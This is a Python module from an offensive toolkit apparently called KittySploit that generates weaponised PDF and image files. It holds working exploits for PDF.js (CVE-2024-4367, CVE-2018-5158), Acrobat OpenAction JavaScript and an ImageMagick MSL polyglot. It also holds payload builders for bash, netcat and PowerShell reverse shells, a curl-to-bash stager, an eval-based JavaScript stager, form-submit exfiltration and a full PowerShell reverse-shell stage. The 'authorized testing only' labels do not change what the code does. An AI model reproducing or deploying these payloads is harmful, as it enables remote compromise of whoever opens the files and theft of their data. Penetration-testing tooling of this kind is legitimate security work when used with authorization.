"""Staged / RCE-oriented PDF generators for authorized penetration testing."""

from __future__ import annotations

import base64
import os
from pathlib import Path
from typing import Optional

from lib.pdf.generators.viewer_cve import _CMBX12_FONT_B64  # noqa: SLF001


def _escape_pdfjs_fontmatrix_js(js: str) -> str:
    """Escape JS for FontMatrix (CVE-2024-4367) injection context."""
    escaped = js.replace("\\", "\\\\").replace('"', '\\"')
    return f"1\\); {escaped}//"


def build_pdfjs_js(payload_mode: str, *, lhost: str, lport: int, stage_url: str) -> str:
    host = (lhost or "").strip()
    port = int(lport or 0)
    stage = stage_url.strip().rstrip("/")
    if not stage:
        raise ValueError("stage_url is required")

    if payload_mode == "callback":
        return f'fetch("{stage}/callback.pdfjs")'
    if payload_mode == "fetch_stager":
        return f'fetch("{stage}/stage.js").then(function(r){{return r.text()}}).then(function(c){{eval(c)}})'
    if payload_mode == "websocket_c2":
        ws = stage.replace("https://", "wss://").replace("http://", "ws://")
        if not ws.startswith(("ws://", "wss://")):
            ws = f"ws://{stage.lstrip('/')}/"
        return f'new WebSocket("{ws}")'
    if payload_mode == "reverse_shell_hint":
        return (
            f'fetch("{stage}/stage.js").then(function(r){{return r.text()}}).then(function(c){{eval(c)}})'
        )
    raise ValueError(f"Unknown PDF.js payload mode: {payload_mode}")


def build_stage_js_template(payload_mode: str, *, lhost: str, lport: int) -> str:
    """JavaScript served at STAGE_URL for PDF.js second-stage (authorized tests)."""
    host = (lhost or "").strip()
    port = int(lport or 0)
    c2 = f"http://{host}:{port}" if host and port else "/* set CALLBACK_URL */"
    if payload_mode in ("fetch_stager", "reverse_shell_hint"):
        return f"""// KittySploit PDF.js stage — authorized testing only
// Host this file at STAGE_URL/stage.js
(function() {{
  var C2 = "{c2}";
  fetch(C2 + "/stage-loaded?ctx=pdfjs");
}})();
"""
    if payload_mode == "websocket_c2":
        ws = f"ws://{host}:{port}/" if host and port else "ws://attacker:port/"
        return f"""// WebSocket stage endpoint expected at {ws}
"""
    return f'fetch("{c2}/callback");\n'


def create_pdfjs_fontmatrix_rce(filename: Path | str, js_payload: str) -> None:
    font_stream = base64.b64decode(_CMBX12_FONT_B64)
    injection = _escape_pdfjs_fontmatrix_js(js_payload)
    path = Path(filename)
    with path.open("wb") as file:
        file.write(b"%PDF-1.7\n\n")
        file.write(b"1 0 obj\n<< /Pages 2 0 R /Type /Catalog >>\nendobj\n\n")
        file.write(
            b"2 0 obj\n<< /Count 1 /Kids [3 0 R] /MediaBox [0 0 595 842] /Type /Pages >>\nendobj\n\n"
        )
        file.write(
            b"3 0 obj\n<< /Contents 4 0 R /Parent 2 0 R "
            b"/Resources << /Font << /F1 5 0 R >> >> /Type /Page >>\nendobj\n\n"
        )
        file.write(
            b"4 0 obj\n<< >>\nstream\nBT\n7 Tr\n10 20 TD\n/F1 20 Tf\n(F) Tj\nET\nendstream\nendobj\n\n"
        )
        file.write(b"5 0 obj\n<< /BaseFont /SNCSTG+CMBX12 /FontDescriptor 6 0 R")
        file.write(f' /FontMatrix [1 2 3 4 5 ({injection})]'.encode())
        file.write(b" /Subtype /Type1 /Type /Font >>\nendobj\n\n")
        file.write(
            b"6 0 obj\n<< /Flags 4 /FontBBox [-53 -251 1139 750] /FontFile 7 0 R "
            b"/FontName /SNCSTG+CMBX12 /ItalicAngle 0 /Type /FontDescriptor >>\nendobj\n\n"
        )
        file.write(b"7 0 obj\n<< /Filter /ASCII85Decode >>\nstream\n")
        file.write(font_stream)
        file.write(b"\nendstream\nendobj\n\n")
        file.write(b"trailer << /Root 1 0 R /Size 8 >>\n%%EOF\n")


def create_pdfjs_postscript_rce(filename: Path | str, js_payload: str) -> None:
    path = Path(filename)
    body = "{" + f" {js_payload} " + "}"
    with path.open("w", encoding="utf-8") as file:
        file.write(
            f"""%PDF-1.7

1 0 obj
  << /Type /Catalog
     /Pages 2 0 R
  >>
endobj

2 0 obj
  << /Type /Pages
     /Kids [3 0 R]
     /Count 1
     /MediaBox [0 0 595 842]
  >>
endobj

3 0 obj
  << /Type /Page
     /Parent 2 0 R
     /Resources
      << /Font
          << /F1
              << /Type /Font
                 /Subtype /Type1
                 /BaseFont /Courier
              >>
          >>
         /XObject << /Im0 6 0 R >>
      >>
     /Contents [4 0 R]
  >>
endobj

4 0 obj
  << /Length 67 >>
stream
  BT
    /F1 22 Tf
    30 800 Td
    (CVE-2018-5158 staged) Tj
  ET
  /Im0 Do
endstream
endobj

5 0 obj
  << /FunctionType 4
     /Domain [0 1]
     /Range [0 1]
     /Length {len(body)}
  >>
stream
{body}
endstream
endobj

6 0 obj
  << /Type /XObject
     /Subtype /Image
     /Width 1
     /Height 1
     /BitsPerComponent 8
     /ColorSpace [/Separation /All /DeviceGray 5 0 R]
     /Length 1
  >>
stream

endstream
endobj

xref
0 7
0000000000 65535 f
0000000010 00000 n
0000000069 00000 n
0000000170 00000 n
0000000510 00000 n
0000000640 00000 n
0000000800 00000 n
trailer
  << /Root 1 0 R
     /Size 7
  >>
startxref
1050
%%EOF
"""
    )


def build_shell_command(payload_mode: str, *, lhost: str, lport: int, custom_command: str = "") -> str:
    host = lhost.strip()
    port = int(lport)
    if payload_mode == "reverse_shell_bash":
        return f"bash -i >& /dev/tcp/{host}/{port} 0>&1"
    if payload_mode == "reverse_shell_nc":
        return f"rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {host} {port} >/tmp/f"
    if payload_mode == "curl_bash_stager":
        return f"curl -fsSL http://{host}:{port}/stager.sh|bash"
    if payload_mode == "custom_cmd":
        cmd = custom_command.strip()
        if not cmd:
            raise ValueError("CUSTOM_COMMAND is required for custom_cmd mode")
        return cmd
    raise ValueError(f"Unknown shell payload mode: {payload_mode}")


def create_imagemagick_polyglot_rce(filename: Path | str, command: str) -> None:
    """ImageMagick/GraphicsMagick MSL polyglot — server-side command execution."""
    path = Path(filename)
    basename = path.name
    safe_cmd = command.replace("`", "\\`")
    with path.open("w", encoding="utf-8") as file:
        file.write(
            f"""<image authenticate='ff" `{safe_cmd}`;"'>
  <read filename="pdf:/etc/passwd"/>
  <resize geometry="400x400" />
  <write filename="test.png" />
  <svg width="700" height="700" xmlns="http://www.w3.org/2000/svg"
       xmlns:xlink="http://www.w3.org/1999/xlink">
    <image xlink:href="msl:{basename}" height="100" width="100"/>
  </svg>
</image>
"""
        )


def _escape_acrobat_js_string(js: str) -> str:
    return js.replace("\\", "\\\\").replace("'", "\\'")


def build_acrobat_js_reverse_shell(payload_cmd: str) -> str:
    """Embed a framework-generated shell command in Acrobat OpenAction JS."""
    cmd = payload_cmd.strip()
    if not cmd:
        raise ValueError("Payload command is empty")
    inner = cmd.replace("\\", "\\\\").replace('"', '\\"')
    return f'app.launchURL("cmd /c start /min {inner}", true);'


def build_acrobat_js(payload_mode: str, *, lhost: str, lport: int, stage_url: str) -> str:
    host = lhost.strip()
    port = int(lport)
    stage = stage_url.strip() or f"http://{host}:{port}/stage.hta"

    if payload_mode == "callback":
        return f'app.launchURL("{stage}/callback", true);'
    if payload_mode == "launch_stager":
        return f'app.launchURL("{stage}", true);'
    if payload_mode == "powershell_cradle":
        ps = (
            f"powershell -w hidden -nop -c "
            f"\"IEX(New-Object Net.WebClient).DownloadString('http://{host}:{port}/stage.ps1')\""
        )
        return f'app.launchURL("cmd /c start /min {ps}", true);'
    if payload_mode == "submitform_exfil":
        return f'this.submitForm({{cURL: "http://{host}:{port}/exfil", cSubmitAs: "PDF"}});'
    raise ValueError(f"Unknown Acrobat payload mode: {payload_mode}")


def create_acrobat_openaction_rce(filename: Path | str, js_code: str) -> None:
    escaped = _escape_acrobat_js_string(js_code)
    path = Path(filename)
    with path.open("w", encoding="utf-8") as file:
        file.write(
            f"""%PDF-1.4
1 0 obj
<<>>
%endobj
trailer
<<
/Root
  <</Pages <<>>
  /OpenAction
      <<
      /S/JavaScript
      /JS(
      eval(
          '{escaped}';
      )
      >>
  >>
>>"""
        )


def build_stage_ps1_template(lhost: str, lport: int) -> str:
    return f"""# KittySploit Acrobat stage — authorized testing only
# Host at http://{lhost}:{lport}/stage.ps1
$client = New-Object System.Net.Sockets.TCPClient("{lhost}",{lport})
$stream = $client.GetStream()
[byte[]]$bytes = 0..65535|%{{0}}
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i)
    $sendback = (iex $data 2>&1 | Out-String )
    $sendback2 = $sendback + "PS " + (pwd).Path + "> "
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
    $stream.Write($sendbyte,0,$sendbyte.Length)
    $stream.Flush()
}}
$client.Close()
"""


def build_stage_sh_template(lhost: str, lport: int) -> str:
    return f"""#!/bin/bash
# KittySploit ImageMagick stager — authorized testing only
bash -i >& /dev/tcp/{lhost}/{lport} 0>&1
"""


def write_listener_notes(
    output_dir: Path,
    *,
    title: str,
    stage_url: str,
    payload_mode: str,
    lhost: str = "",
    lport: int = 0,
    extra: Optional[list[str]] = None,
) -> Path:
    notes = output_dir / "DELIVERY_NOTES.txt"
    lines = [
        f"# {title}",
        "# Authorized penetration testing only.",
        "",
        f"PAYLOAD_MODE={payload_mode}",
        f"STAGE_URL={stage_url}",
        "",
    ]
    if lhost and lport:
        lines.extend(
            [
                f"LHOST={lhost}",
                f"LPORT={lport}",
                "",
                "Suggested listener (KittySploit):",
                "  use listeners/multi/reverse_tcp",
                f"  set LHOST {lhost}",
                f"  set LPORT {lport}",
                "  run",
                "",
                "Or netcat:",
                f"  nc -lvnp {lport}",
                "",
            ]
        )
    if extra:
        lines.extend(extra)
    notes.write_text("\n".join(lines) + "\n", encoding="utf-8")
    return notes
